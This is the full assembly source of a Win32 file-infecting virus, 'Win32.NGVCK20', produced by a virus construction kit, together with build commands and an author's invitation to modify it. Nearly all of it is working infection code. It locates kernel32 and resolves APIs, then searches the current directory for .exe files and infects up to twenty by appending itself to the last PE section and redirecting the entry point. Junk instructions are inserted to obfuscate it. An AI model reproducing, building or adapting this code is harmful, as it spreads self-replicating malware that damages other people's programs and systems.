              
;
;
; Win32.NGVCK20 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK20
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 21
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop ebp
 sub ebp, offset Delta
 jmp KernelSearchStart


;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 sub edx, edx

 push edx
 push edx
 push 3h
 push edx
                                        ; add edx, 1
 sub edx, -1d
 push edx
 mov ebx, 80000000h or 40000000h
 push ebx
 lea edi, [ebp+WFD_szFileName]
 xchg edi, ecx

 push ecx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
 push ebx

                                        ; clear ecx
 sub ecx, ecx
 push ecx
 push ebx
 push ecx
 push 00000004h
 push ecx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ebx
 test eax, eax
 jz CloseFile
 push ebx
 push 0
 push 0
                                        ; mov edx, 2
 mov edx, ( 2d xor 39d )
 xor edx, 39d
 push edx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 test eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 TempApisearch2 dd 0h
 counter     dw 0h
 Trash1      dd 0h
 FileHandle  dd 0h
 filemask    db '*.EXe',0
 TempAPI     dd 0h

 APINames:
 db 'UnmapViewOfFile', 0
 db 'FindFirstFileA', 0
 db 'CloseHandle', 0
 db 'CreateFileA', 0
 db 'FindClose', 0
 db 'CreateFileMappingA', 0
 db 'FindNextFileA', 0
 db 'MapViewOfFile', 0

 FindHandle  dd 0h
 AlignReg2   dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 db 'Virus : Win32.NGVCK20 Author : SnakeByte',0
 KernelPE    dd 0h
 MapHandle   dd 0h
 KernelMZ    dd 0h
 NewEIP      dd 0h
 ATableVA    dd 0h
 NTableTemp  dd 0h

 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XFindFirstFileA        dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XFindClose             dd 0h
 XCreateFileMappingA    dd 0h
 XFindNextFileA         dd 0h
 XMapViewOfFile         dd 0h

 OldBase     dd 400000h
 OTableVA    dd 0h
 Trash2      dd 0h
 OldEIP      dd 0h
 NTableVA    dd 0h
 MapAddress  dd 0h
 InfCounter  dd 0h
 NewSize     dd 0h
 AlignReg1   dd 0h




;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; eax Lenght of API-Name
                                        ; esi Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h



 mov edi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edx
 xor edx, edx
 add edx, [edi+78h]
 add edx, [ebp+KernelMZ]
 or ebx, ecx                            ; Trash
                                        ; add edx, 28
 dec edx
 add edx, 29d
                                        ; get ATableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
                                        ; add edx, 4
 inc edx
 add edx, 3d
 mov dword ptr [ebp+ATableVA], edi
                                        ; get NTableVA
 mov edi, dword ptr [edx]
 and ebx, 53627008d                     ; Trash
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edi
                                        ; add edx, 4
 add edx, 4d
                                        ; get OTableVA
 mov edi, dword ptr [edx]
 add edi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edi
 mov ebx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], 0
 add dword ptr [ebp+NTableTemp], ebx
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
                                        ; mov ebx, edx
 mov ebx, edx
                                        ; mov edi, ebx
 mov edi, ebx
 push eax
 mov dword ptr [ebp+TempApisearch2], edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov edx, eax                           ; Trash
 mov ch, byte ptr [esi]
 cmp ch, byte ptr [edi]
 jne ApiNotFound
 add eax, -1
 cmp eax, 0
 je FoundApi1
                                        ; add esi, 1
 inc esi
                                        ; add edi, 1
 add edi, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop esi
 pop eax
 push dword ptr [ebp+TempApisearch2]
 pop edi
 mov ebx, dword ptr [ebp+NTableTemp]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop esi
 pop edi
                                        ; retrieve the offset
                                        ; clear edx
 xor edx, edx
 mov dx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl edx, 1                             ; multiply with 2
 add edx, dword ptr [ebp+OTableVA]
 mov ecx, edx
 movzx edx, word ptr [ecx]
 sal edx, 2h
 add edx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [edx]
 add ebx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 add dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ebx
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, [edi+3Ch]
 add eax, edi
                                        ; get File Alignment
 mov edx, [eax+3Ch]
 mov ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 xor dword ptr [ebp+AlignReg2], edx
 mov dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ebx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
 mov esi, dword ptr [ebp+MapAddress]
 dec eax                                ; Trash
                                        ; retrieve PE - Header again
 mov eax, dword ptr [esi+3Ch]
 add eax, esi
 rol ecx, 15d                           ; Trash
                                        ; infect by increasing the last section
 mov esi, eax
                                        ; get last section
                                        ; clear edx
 mov edx, 0
 mov dx, word ptr [esi+06h]
 sub edx, 1
 imul edx, edx, 28h
 rol ebx, 29d                           ; Trash
                                        ; add eax, 120
 inc eax
 add eax, 119d
 add eax, edx
 mov ebx, dword ptr [esi+74h]
 shl ebx, 3
 add eax, ebx
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], ebx
 mov edx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], edx
 and ebx, ecx                           ; Trash
                                        ; clear edx
 push 0
 pop edx

 add edx, [eax+10h]
                                        ; mov ecx, edx
 push edx
 pop ecx
 add edx, [eax+14h]
 push edx
 push ecx
 pop ebx
 add ebx, [eax+0Ch]
 mov dword ptr [ebp+NewEIP], ebx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], 0
 add dword ptr [esi+28h], ebx
                                        ; clear ebx
 mov ebx, 11189d
 sub ebx, 11189d

 add ebx, [eax+10h]
 push ebx
                                        ; calculate new section size
 push dword ptr  [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], ebx
 call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [eax+10h], 0h
 add dword ptr [eax+10h], ebx
 pop ebx
 add ebx,  (VirusSize-69d)
 add ebx, 69d
 mov dword ptr [eax+08h], 0
 add dword ptr [eax+08h], ebx
 adc dword ptr [ebp+Trash1], eax        ; Trash
 mov ebx, dword ptr [eax+10h]
 add ebx, dword ptr [eax+0Ch]
 mov dword ptr [esi+50h], ebx
                                        ; set write, read and code flag
 or dword ptr [eax+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 add edx, ebx                           ; Trash
 add edi, dword ptr [ebp+MapAddress]
 mov eax, VirusSize
 lea ebx, [ebp+Virus]
 xchg esi, ebx


AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; clear ebx
 mov ebx, -13902d
 add ebx, 13902d
 add ebx, dword ptr [ebp+InfCounter]
 add ebx, -1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ecx, NumberOfApis

                                        ; load API Names and Offsets
 mov ebx, ebp
 add ebx, offset APIOffsets

 lea esi, [ebp+APINames]


GetApisLoop: 

 mov eax, esi
APINameDetect:                          ; calculate the lenght of the names
 add eax, 1d
 cmp byte ptr [eax], 0
 jne APINameDetect
 rcl edx, 16d                           ; Trash
 shl edx, 6d                            ; Trash

 push eax
 sub dword ptr [esp], esi
 pop eax
                                        ; search 'em
                                        ; eax contains Name-Lenght
                                        ; esi points to the Name
                                        ; ebx points to the offset

 call SearchAPI1
 push esi
 add dword ptr [esp], eax
 pop esi
                                        ; add esi, 1
 sub esi, -1d
 mov edx, dword ptr [ebp+TempAPI]
 mov dword ptr [ebx], 0
 add dword ptr [ebx], edx
                                        ; add ebx, 4
 add ebx, 4d
 loop GetApisLoop
 jmp Outbreak



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 add ecx, 43837792d                     ; Trash
 mov ecx, ebp
 add ecx, offset filemask

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 sub eax, -1d
 test eax, eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
                                        ; mov ebx, 20
 mov ebx, 0
 add ebx, 20d
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ebx

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
                                        ; clear edx
 mov edx, -16018d
 add edx, 16018d
 mov ecx, dword ptr [ebp+AlignReg2]
 push eax
 div ecx
 sub ecx, edx
 pop eax
 add eax, ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret
 adc dword ptr [ebp+Trash1], 54685      ; Trash


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx ebx, word ptr [ecx]
 cmp ebx, 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
                                        ; clear ebx
 and ebx, 0
 mov bx, word ptr [ecx+3Ch]
 test ebx, ebx
 jz Notagoodfile
 mov edi, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp edi, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edi, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
                                        ; mov ebx, 12068
 mov ebx, ( 12068d xor 21d )
 xor ebx, 21d
 cmp ebx, 12068d
 je Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], 'NGVC'
 jz Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], ecx
 or ebx, 43598489d                      ; Trash

 mov ebx, dword ptr [ebp+OldEIP]
 ror eax, 15d                           ; Trash

 push ebx
 pop dword ptr [ebp+retEIP]



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 push ebx
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop edi
 push edi
                                        ; store old EIP and ImageBase
                                        ; clear esi
 mov esi, 22933d
 sub esi, 22933d
 add esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], esi

                                        ; mov ebx, -1
 mov ebx, ( -1d + 29d )
 sub ebx, 29d
 and ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx


                                        ; round to pages
 shr edi, 16d
 shl edi, 16d
                                        ; add edi, 1
 add edi, 1d
GetKernelLoop:
                                        ; clear eax
 mov eax, 0
 sub edi, 1
 mov ax, word ptr [edi+03ch]
 cmp ax,0f800h
 je GetKernelLoop
 cmp edi, dword ptr [edi+eax+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 add dword ptr [ebp+KernelMZ], edi
 mov ecx, edi
 add ecx, [edi+3Ch]
 mov [KernelPE+ebp], ecx

 jmp GetApis

;          [ ///// * FindFiles Procedure * \\\\\ ]

 dec ecx                                ; Trash

FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg edi, ebx

 push edi
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edi, [ebp+WFD_szFileName]
 xchg edi, ebx

                                        ; mov eax, 276
 mov eax, ( 276d xor 3d )
 xor eax, 3d

ClearOldData2:
 mov byte ptr [ebx], 0h
                                        ; add ebx, 1
 inc ebx
 dec eax
 jnz ClearOldData2
 dec dword ptr [ebp+Trash1]             ; Trash
 popad
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov edx, ebp
 add edx, offset WIN32_FIND_DATA

 push edx
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret





CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

